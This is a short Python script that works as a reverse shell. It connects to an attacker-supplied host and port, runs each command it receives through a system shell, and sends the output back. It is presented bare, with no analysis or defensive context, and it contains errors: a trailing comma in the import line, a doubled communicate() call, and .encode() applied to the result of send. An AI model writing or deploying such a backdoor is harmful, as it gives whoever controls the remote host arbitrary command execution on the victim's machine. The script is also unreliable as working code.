import socket, subprocess as sp, threading, sys,

ENCODING = 'UTF-8'
host = str(sys.argv[1])
port = int(sys.argv[2])

conn = socket.socket()
conn.connect((host, port))


while True:
    command = str(conn.recv(1024).decode(ENCODING))
    if command != "exit()":
        sh = sp.Popen(command, shell=True,
                        stdout = sp.PIPE,
                        stderr = sp.PIPE,
                        stdin = sp.PIPE,
                      universal_newlines=True
                      )

        out, err = sh.communicate()
        print (sh.communicate())
        print (out, err) # Pour test
        result = str(out) + str(err)
        length = str(len(result)).zfill(16)
        conn.send(length+result).encode(ENCODING)

    else:
        break

conn.close()
